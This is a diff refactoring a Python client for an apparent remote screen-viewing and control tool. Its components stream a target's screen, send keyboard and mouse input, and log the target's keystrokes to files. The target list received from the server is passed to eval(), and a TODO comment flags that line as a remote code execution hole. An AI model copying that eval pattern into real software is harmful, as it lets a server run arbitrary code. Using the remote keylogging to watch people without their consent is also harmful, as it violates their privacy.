@@ -9,24 +9,85 @@ import os
 from pynput.keyboard import Listener as KeyboardListener, Key, KeyCode
 from queue import Queue, Empty
 from random import random
-from socket import socket
+from socket import socket, SHUT_RDWR
 from threading import Lock, Thread
 from time import time, sleep
-from typing import List, Tuple
+from typing import Dict, List, Tuple
 
 
-class Watcher(Socket):
+class BaseWatcher(Socket):
+    config = Config()
+
+    def __init__(self, *args, **kwargs) -> None:
+        super().__init__(*args, **kwargs)
+
+        self.client_type: bytes
+        self.target_code: str
+
+    def reset(self):
+        pass
+
+    def start(self):
+        self.reset()
+        name = self.__class__.__name__
+        logging.info(f"Starting Watcher {name}")
+        try:
+            self.connect()
+        except (ConnectionRefusedError, TimeoutError):
+            logging.fatal("Cannot connect to server. Aborting")
+            self.stop()
+            return
+
+        try:
+            self.send_data(self.client_type)
+            self.send_data(self.config.code.encode(self.FORMAT))
+            self.send_data(self.target_code.encode(self.FORMAT))
+            data = self.recv_data()
+            if data == Reasons.ALREADY_CONNECTED:
+                logging.info(f"{name} already connected to server")
+                self.stop()
+                return
+            elif data == Reasons.MAIN_NOT_CONNECTED:
+                logging.info("Main watcher Not connected to server")
+                self.stop()
+                return
+            elif data == b"OK":
+                pass
+            else:
+                raise ValueError(f"Unknown value for reason '{data}'")
+        except (BrokenPipeError, ConnectionResetError):
+            # logging.debug(traceback.format_exc())
+            logging.fatal("Connection to server closed unexpectedly. Aborting")
+            self.stop()
+            return
+
+
+class Watcher(BaseWatcher):
 
     def __init__(self):
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
 
         self.running = False
         self.watching = False
-        self.config = Config()
         self.target_list: List[str] = []
 
-        self.screen_reader = None
-        self.controller = None
+        # self.screen_reader: ScreenReader = None
+        # self.controller: Controller = None
+        # self.keylogger: KeyLogger = None
+
+        self.components: Dict[bytes, BaseWatcher] = {
+            ClientTypes.WATCHER_SCREEN_READER: ScreenReader(),
+            ClientTypes.WATCHER_CONTROLLER: Controller(),
+            ClientTypes.WATCHER_KEYLOGGER: KeyLogger()
+        }
+
+        for component in self.components.values():
+            component.watcher = self
+            # logging.debug(str(component))
+
+        self.screen_reader = self.components[ClientTypes.WATCHER_SCREEN_READER]
+        self.controller = self.components[ClientTypes.WATCHER_CONTROLLER]
+        self.keylogger = self.components[ClientTypes.WATCHER_KEYLOGGER]
 
         self.request_lock = Lock()
 
@@ -68,22 +129,22 @@ class Watcher(Socket):
             self.stop()
             return False
 
-        Thread(target=self.update_target_list).start()
+        Thread(target=self.run).start()
 
         return True
 
-    def update_target_list(self):
+    def run(self):
         """
             Keeps fetching list of targets from Server
         """
         while self.running:
+            # logging.debug("Running")
             with self.request_lock:
-                self.send_data(Actions.SEND_TARGET_LIST)
                 try:
+                    self.send_data(Actions.SEND_TARGET_LIST)
                     target_list = self.recv_data().decode(self.FORMAT)
-                except OSError:
-                    logging.debug("OSError while getting target list. "
-                                  "Aborting")
+                except (OSError, BrokenPipeError, ConnectionResetError):
+                    logging.info("Connection to server closed. Aborting")
                     self.running = False
                     break
             if not target_list:
@@ -92,45 +153,52 @@ class Watcher(Socket):
                 break
 
             """
-                TODO: WARNING: Next line is vulnerable and can result in
+                TODO: WARNING: Next line is vulnerable and may result in
                     remote code execution. Fix it
             """
             self.target_list = eval(target_list)
-            sleep(1)
+            sleep(.2)
+        logging.info("Main watcher stopped")
 
     def watch(self, target_code):
         """"
             Start screen reader and controller
         """
         self.watching = True
-        self.screen_reader = ScreenReader(target_code)
-        self.screen_reader.watcher = self
-        self.controller = Controller(target_code)
-        self.controller.watcher = self
-        self.keylogger = KeyLogger(target_code)
-        self.keylogger.watcher = self
-        Thread(target=self.screen_reader.start).start()
-        Thread(target=self.controller.start).start()
-        Thread(target=self.keylogger.start).start()
-        return True
+        self.start_all(target_code)
+
+    @property
+    def active_components(self) -> List[bytes]:
+        return filter(lambda component: self.components[component].running,
+                      self.components.keys())
+
+    def start_all(self, target_code):
+        for component in self.components.keys():
+            self.start_component(component, target_code)
+
+    def start_component(self, component, target_code):
+        if component not in self.active_components:
+            self.components[component].target_code = target_code
+            Thread(target=self.components[component].start).start()
+    
+    def stop_component(self, component):
+        if component in self.active_components:
+            self.components[component].stop()
 
     def stop_watching(self):
         """
             Send stop watching request to the server
         """
         self.watching = False
-        with self.request_lock:
-            try:
-                self.send_data(Actions.STOP_WATCHING)
-            except (BrokenPipeError, ConnectionResetError):
-                pass
+        self.screen_reader.stop()
+        self.controller.stop()
+        self.keylogger.stop()
 
     def stop(self):
         """
             Stop the main watcher client and all its dependents
             (ScreenReader, Controller, etc.)
         """
-        logging.info("Stopping Watcher")
         if self.watching:
             self.stop_watching()
         self.running = False
@@ -138,40 +206,28 @@ class Watcher(Socket):
         self.socket.close()
 
 
-class ScreenReader(Socket):
+class ScreenReader(BaseWatcher):
     """
         The class with methods to read the target screen
     """
 
-    def __init__(self, target_code: str):
+    def __init__(self):
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
-        self.target_code = target_code
+        self.target_code = ""
         self.config = Config()
         self.watcher: Watcher = None
+        self.client_type = ClientTypes.WATCHER_SCREEN_READER
+
+    def reset(self):
+        self.stop()
+        self.socket.close()
+        self.socket = self.new_socket()
 
     def start(self):
         """
             Start the screen reader client
         """
-        logging.info("Starting Watcher Screen Reader")
-        try:
-            self.connect()
-        except (ConnectionRefusedError, TimeoutError):
-            logging.fatal("Cannot connect to server. Aborting")
-            self.stop()
-            return
-        logging.info("Connected to server")
-
-        try:
-            self.send_data(ClientTypes.WATCHER_SCREEN_READER)
-            self.send_data(self.config.code.encode(self.FORMAT))
-            self.send_data(self.target_code.encode(self.FORMAT))
-            self.recv_data().decode(self.FORMAT)  # receive "OK"
-        except (BrokenPipeError, ConnectionResetError):
-            # logging.debug(traceback.format_exc())
-            logging.fatal("Connection to server closed unexpectedly. Aborting")
-            self.stop()
-            return
+        super().start()
 
         self.running = True
         self.run()
@@ -184,11 +240,12 @@ class ScreenReader(Socket):
         i = 0
         while self.running and self.watcher.watching:
             try:
-                self.img = self.recv_data()
-                if not self.img:
+                img = self.recv_data()
+                if not img:
                     logging.info("Connection to screen reader "
                                  "closed by server.")
                     break
+                self.img = img
                 i += 1
                 if i == ACKNOWLEDGEMENT_ITERATION:
                     self.send_data(b"OK")  # send acknowledgement
@@ -207,11 +264,13 @@ class ScreenReader(Socket):
         """
             Stop screen reader only
         """
-        self.running = False
-        self.socket.close()
+        if self.running:
+            self.running = False
+            self.socket.shutdown(SHUT_RDWR)
+            self.socket.close()
 
 
-class Controller(Socket):
+class Controller(BaseWatcher):
     """
         The main controller client.
         All controllers (i.e mouse controller, keyboard controller, etc.) use
@@ -219,47 +278,29 @@ class Controller(Socket):
         they all use `control_lock` (an object of `threading.Lock`).
     """
 
-    def __init__(self, target_code: str):
+    def __init__(self):
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
-        self.target_code = target_code
+
+        self.config = Config()
+        self.target_code = ""
         self.control_lock = Lock()
-        # self.keyboard_controller = KeyboardController(self.socket,
-        #     self.control_lock)
+        self.reset()
+        self.watcher: Watcher = None
+        self.client_type = ClientTypes.WATCHER_CONTROLLER
+
+    def reset(self):
+        self.socket.close()
+        self.socket = self.new_socket()
         self.mouse_controller = MouseController(self.socket, self.control_lock)
         self.keyboard_controller = KeyboardController(self.socket,
                                                       self.control_lock)
-        self.watcher: Watcher = None
-        self.config = Config()
+        self.keyboard_controller.controller = self
 
     def start(self):
         """
             Start all the controllers
         """
-        logging.info("Starting watcher controller")
-        # self.keyboard_controller.start()
-        # self.connect()
-        # self.send_data(WATCHER_CONTROLLER.encode(self.FORMAT))
-        # self.running = True
-        # Thread(target=self.run).start()
-
-        try:
-            self.connect()
-        except (ConnectionRefusedError, TimeoutError):
-            logging.fatal("Cannot connect to server. Aborting")
-            self.stop()
-            return
-        logging.info("Connected to server")
-
-        try:
-            self.send_data(ClientTypes.WATCHER_CONTROLLER)
-            self.send_data(self.config.code.encode(self.FORMAT))
-            self.send_data(self.target_code.encode(self.FORMAT))
-            self.recv_data()  # receive b"OK"
-        except (BrokenPipeError, ConnectionResetError):
-            # logging.debug(traceback.format_exc())
-            logging.fatal("Connection to server closed unexpectedly. Aborting")
-            self.stop()
-            return
+        super().start()
 
         self.mouse_controller.start()
         self.keyboard_controller.start()
@@ -273,15 +314,26 @@ class Controller(Socket):
             are called here at regular intervals after some delay
         """
         while self.running:
-            self.keyboard_controller.update()
-            self.mouse_controller.update()
-            sleep(0.001)
-            self.running = self.watcher.running
+            try:
+                k = self.keyboard_controller.update()
+                m = self.mouse_controller.update()
+                if not (k or m):
+                    self.send_data(Actions.WAIT)
+                    sleep(0.01)
+                sleep(0.001)
+                self.running = self.watcher.running
+            except (ConnectionResetError, BrokenPipeError):
+                break
+        logging.info("Stopping Controller")
         self.stop()
 
     def stop(self):
         self.running = False
         self.keyboard_controller.stop()
+        try:
+            self.send_data(Actions.DISCONNECT)
+        except (ConnectionResetError, BrokenPipeError, OSError):
+            pass
         self.socket.close()
 
 
@@ -296,6 +348,7 @@ class KeyboardController(Socket):
         self.listener = None
         self.keys = Queue(0)
         self.control_lock = control_lock
+        self.controller: Controller
 
         # `_window_in_focus` and `_keyboard_on` to be set by GUI app
         self._window_in_focus = True
@@ -323,13 +376,11 @@ class KeyboardController(Socket):
 
     @property
     def capture_keys(self):
-        return self._capture_keys
+        return self._capture_keys and self.controller.watcher.watching
 
     @capture_keys.setter
     def capture_keys(self, value):
         self._capture_keys = value
-        # self.stop()
-        # self.start(self._capture_keys)
         if self.capture_keys:
             self.start()
         else:
@@ -340,8 +391,9 @@ class KeyboardController(Socket):
             The key queue is updated every time a key is pressed.
             pynput keyboard listener is used.
         """
+        logging.info("Starting Keyboard Controller")
+        self.running = True
         if supress is None:
-            logging.info("Starting Keyboard Controller")
             supress = self.capture_keys
         self.listener = KeyboardListener(on_press=self.on_press,
                                          on_release=self.on_release,
@@ -352,32 +404,27 @@ class KeyboardController(Socket):
         """
             Stop the pynput keyboard listener
         """
-        self.listener.stop()
+        if self.running:
+            self.running = False
+            self.listener.stop()
+            logging.info("Stopped Keyboard Controller")
 
     def on_press(self, key: Key | KeyCode | None):
         """
             put `vk` value in self.keys
         """
-        # logging.debug((self._window_in_focus,
-        #     self._keyboard_on, self.capture_keys))
-        # print(self.listener.suppress, self.listener._suppress)
         if self.capture_keys:
             if isinstance(key, Key):
                 self.keys.put((DeviceEvents.KEY_DOWN, key.value.vk))
-                # logging.debug((key.name, key.value.vk,
-                #     key.value.combining, key.value.char))
             elif isinstance(key, KeyCode):
                 self.keys.put((DeviceEvents.KEY_DOWN, key.vk))
-                # logging.debug((key.vk, key.combining, key.char))
 
     def on_release(self, key):
         if self.capture_keys:
             if isinstance(key, Key):
                 self.keys.put((DeviceEvents.KEY_UP, key.value.vk))
-                # logging.debug((key.name, key.value))
             elif isinstance(key, KeyCode):
                 self.keys.put((DeviceEvents.KEY_UP, key.vk))
-                # logging.debug((key.vk, key.combining, key.char))
 
     def update(self):
         """
@@ -388,6 +435,8 @@ class KeyboardController(Socket):
                 event = self.keys.get_nowait()
                 self.send_data(str((ControlDevice.CONTROL_KEYBOARD,
                                     *event)).encode(self.FORMAT))
+            return True
+        return False
 
     def get_keys(self):
         """
@@ -422,10 +471,6 @@ class MouseController(Socket):
 
     @property
     def mouse_on(self):
-        pass
-
-    @mouse_on.getter
-    def mouse_on(self):
         return self._mouse_on
 
     @mouse_on.setter
@@ -453,7 +498,7 @@ class MouseController(Socket):
 
     def update(self):
         """
-            Sends only one click at a time
+            Sends mouse control events to server.
         """
 
         """ One at a time method """
@@ -468,8 +513,9 @@ class MouseController(Socket):
 
         """ Many at a time method """
         events = self.get_events()
-        # logging.debug(events)
         ln = len(events)
+        if ln == 0:
+            return False
         for i, event in enumerate(events):
             events.extend(self.get_events())
             if (i < ln - 1) and \
@@ -479,16 +525,15 @@ class MouseController(Socket):
             with self.control_lock:
                 self.send_data(str((ControlDevice.CONTROL_MOUSE,
                                     *event)).encode(self.FORMAT))
-                # self.send_data(ControlDevice.CONTROL_MOUSE)
-                # self.send_data(str(event).encode(self.FORMAT))
+        return True
 
     def stop(self):
         pass
 
 
-class KeyLogger(Socket):
+class KeyLogger(BaseWatcher):
     """
-        writes all keys pressed to `Logs/KeyLogs/keys<time><random>.txt`
+        writes all keys pressed to `Logs/KeyLogs/keys<time>_<random>.txt`
     """
 
     SPECIAL_KEY = 0x0
@@ -497,7 +542,7 @@ class KeyLogger(Socket):
     class LoggedKey(namedtuple("LoggedKey", ["name", "char", "type"])):
         pass
 
-    def __init__(self, target_code: str) -> None:
+    def __init__(self) -> None:
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
 
         if not os.path.exists("Logs"):
@@ -506,52 +551,38 @@ class KeyLogger(Socket):
             os.mkdir("Logs/KeyLogs")
 
         self.config = Config()
-        self.target_code = target_code
-        self.watcher: Watcher = None
+        self.target_code = ""
+        self.client_type = ClientTypes.WATCHER_KEYLOGGER
 
-        self.logfile_path = f"Logs/KeyLogs/keys{time()}_{random()}"
+        self.reset()
+        self.watcher = None
 
         self.key_to_name = {key: str(key).split(".")[-1] for key in Key}
 
         from pynput.keyboard._xorg import Listener
         from pynput._util.xorg_keysyms import KEYSYMS, SYMBOLS
-        self.SPECIAL_KEYS = Listener._SPECIAL_KEYS
-        self.KEYPAD_KEYS: dict[int, KeyCode] = Listener._KEYPAD_KEYS
+        self.SPECIAL_KEYS = Listener._SPECIAL_KEYS.copy()
+        self.KEYPAD_KEYS: dict[int, KeyCode] = Listener._KEYPAD_KEYS.copy()
         self.SPECIAL_KEYS.pop(Key.space.value.vk)
 
         self.KEYSYMS = KEYSYMS
         self.SYMBOLS = SYMBOLS
 
+    def reset(self):
+        self.socket.close()
+        self.socket = self.new_socket()
+        self.logfile_path = f"Logs/KeyLogs/keys{time()}_{random()}"
+
     def start(self):
         """
             Start the keylogger. Connect to the server.
         """
-
-        logging.info("Starting keylogger")
-
-        try:
-            self.connect()
-        except (ConnectionRefusedError, TimeoutError):
-            logging.fatal("Cannot connect to server. Aborting")
-            self.stop()
-            return
-
-        try:
-            self.send_data(ClientTypes.WATCHER_KEYLOGGER)
-            self.send_data(self.config.code.encode(self.FORMAT))
-            self.send_data(self.target_code.encode(self.FORMAT))
-            self.recv_data()  # receive b"OK"
-        except (BrokenPipeError, ConnectionResetError):
-            logging.fatal("Connection to server closed unexpectedly. Aborting")
-            self.stop()
-            return
+        super().start()
 
         self.running = True
-        # self.vk_log = open(f"{self.logfile_path}.vklog")
-        # self.verbose_key_log = open(f"{self.logfile_path}.verbose")
-        # self.key_log = open(f"{self.logfile_path}.log")
         with open(f"{self.logfile_path}.vklog", "w") as self.vk_log, \
-                open(f"{self.logfile_path}.verbose", "w") as self.verbose_key_log, \
+                open(f"{self.logfile_path}.verbose", "w") as \
+                    self.verbose_key_log, \
                 open(f"{self.logfile_path}.log", "w") as self.key_log:
             self.run()
 
@@ -602,21 +633,17 @@ class KeyLogger(Socket):
         """
         vks = " ".join(map(lambda x: str(int.from_bytes(x, "big")),
                            vks.split(b'\0')))
-        # logging.debug(vks+" ")
 
         self.vk_log.write(vks+" ")
         events = iter(vks.split())
         keys = map(lambda key: (int(key[0]), int(key[1])),
                    zip(events, events))
-        # logging.debug(keys)
-        # map(self.log_key, keys)
         for key in keys:
             self.log_key(key)
 
     def log_key(self, key: Tuple[str, str]):
         vk = int(key[1])
         k = self.parse_vk(vk)
-        # logging.debug(str(k))
         if k is None:
             logging.debug(f"missing key for {vk}")
             return
@@ -636,8 +663,10 @@ class KeyLogger(Socket):
         self.verbose_key_log.write(logv)
 
     def stop(self):
-        self.running = False
-        self.socket.close()
+        if self.running:
+            self.running = False
+            self.socket.shutdown(SHUT_RDWR)
+            self.socket.close()
 
 
 if __name__ == "__main__":
